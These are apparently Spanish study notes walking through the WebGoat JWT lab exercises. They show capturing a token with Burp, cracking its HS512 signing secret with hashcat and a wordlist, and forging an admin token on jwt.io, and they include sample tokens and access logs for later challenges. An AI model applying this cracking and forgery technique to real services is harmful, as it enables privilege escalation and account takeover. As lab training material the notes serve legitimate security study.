# JWT tokens

JsonWebTokens 

**********************************************************************

# Proceso
Capturamos la petición

# 1) Capturamos el access token con ayuda de burp
## Access token
```
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1OTQ1MjI5NzEsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiU3lsdmVzdGVyIn0.cmya1cEk7cRqfMLN5RT0yMDOxQu1bsRvdnZE00hsAfxDp4smEsCNZp5_ncymxyu0n6Hch8lYdGQ3SiawIRNqwQ
```

Dado el RFC de JWT sabemos que el token se compone de 3 partes y está separado por `.`

## Access token explain
```
Header:
	eyJhbGciOiJIUzUxMiJ9
Claim: 
	eyJpYXQiOjE1OTQ1MjI5NzEsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiU3lsdmVzdGVyIn0
Signature:
	cmya1cEk7cRqfMLN5RT0yMDOxQu1bsRvdnZE00hsAfxDp4smEsCNZp5_ncymxyu0n6Hch8lYdGQ3SiawIRNqwQ
```

## Access token decoded
```
Header:
	{"alg":"HS512"}
Claim: 
	{"iat":1594522971,"admin":"false","user":"Sylvester"}
Signature:
	?
```

***************************************************************

# 2) Crackeamos el access token para encontrar el "secret" con el que se cifro

Con Ayuda de hashcat trataremos de encontrar el `secret` mediante un ataque de diccionario

1. Creamos un archivo token.txt con nuestro token
2. Usamos el diccionario proporcionado por [first20hours](https://github.com/first20hours/google-10000-english/blob/master/google-10000-english.txt)
3. Usamos la herramienta hashcat

La sintaxis de la herramienta es la siguiente:
```bash
# Using a Wordlist:  
hashcat -a0 -m 16500 text.hash [dict]

# Pure Brute force attack:  
hashcat -a3 -m 16500 text.hash
```

Para nuestro caso sería:
```bash
# Using a Wordlist:  
hashcat -a0 -m 16500 token.txt google-10000-english.txt
```

Lo que nos dará el siguiente output
```
Dictionary cache built:
* Filename..: google-10000-english.txt
* Passwords.: 10000
* Bytes.....: 75888
* Keyspace..: 10000
* Runtime...: 0 secs

eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1OTQ1MjI5NzEsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiU3lsdmVzdGVyIn0.cmya1cEk7cRqfMLN5RT0yMDOxQu1bsRvdnZE00hsAfxDp4smEsCNZp5_ncymxyu0n6Hch8lYdGQ3SiawIRNqwQ:victory
```

Donde podemos observar que el `secret` es `victory`

***************************************************************
# 3) Modificamos y creamos un nuevo token

Una vez que tenemos el `secret` podemos crear un nuevo token correctamente firmado.
Para esto, hacemos lo siguiente:

1. Abrimos jwt.io
2. Pegamos nuestro token original
3. Modificamos `"admin": "false"`, a `"admin": "true"`
4. Ingresamos nuestro `secret` que en este caso es `victory`
5. Copiamos el nuevo token y lo pegamos en la función `repeater` de burp

***********************************************************************

# Materiales de ayuda
+ https://gchq.github.io/CyberChef/
+ https://jwt.io/
+ https://security.stackexchange.com/questions/200918/using-hashcat-in-order-to-crack-the-jwt-signature-in-webgoat
+ https://github.com/first20hours/google-10000-english/blob/master/google-10000-english.txt


************************************************************************

# JWT cracking - 5
Crackea el token y cambia el username por WebGoat

```
eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTU5MzY1ODk2NCwiZXhwIjoxNTkzNjU5MDI0LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.13Z65CLhvxsVYa9upeQ2FH8g726PKAx-qJ11-xmS8fU
```

# JWT Tokens - 7

## El reto 7 y 8 parecen fallar al utilizar cookies en lugar de JWT tokens


¿Puede encontrar la manera de ordenar libros haciendo que pague Tom por ellos?
```
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "GET /JWT/refresh/checkout?token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q HTTP/1.1" 401 242 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/moveToCheckout HTTP/1.1" 200 12783 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/login HTTP/1.1" 200 212 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "GET /JWT/refresh/addItems HTTP/1.1" 404 249 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
195.206.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/moveToCheckout HTTP/1.1" 404 215 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" "-"
```

```bash
# refresh token tom
GET /JWT/refresh/checkout?token=
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q 

# refresh token webgoat
POST /WebGoat/JWT/refresh/checkout HTTP/1.1
eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IkplcnJ5In0.Z-ZX2L0Tuub0LEyj9NmyVADu7tK40gL9h1EJeRg1DDa6z5_H-SrexH1MYHoIxRyApnOP7NfFonP3rOw1Y5qi0A


194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/moveToCheckout HTTP/1.1" 200 12783 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/login HTTP/1.1" 200 212 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "GET /JWT/refresh/addItems HTTP/1.1" 404 249 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
195.206.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/moveToCheckout HTTP/1.1" 404 215 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" "-"
```

# Referencias adicionales
+ https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/
+ https://stackoverflow.com/questions/3252851/how-to-display-request-headers-with-command-line-curl
+ https://github.com/WebGoat/WebGoat/wiki/(Almost)-Fully-Documented-Solution-(en)#jwt-tokens
+ https://haxkerxavier.home.blog/2019/05/04/webgoat-authentication-flaws-jwt-tokens-7/
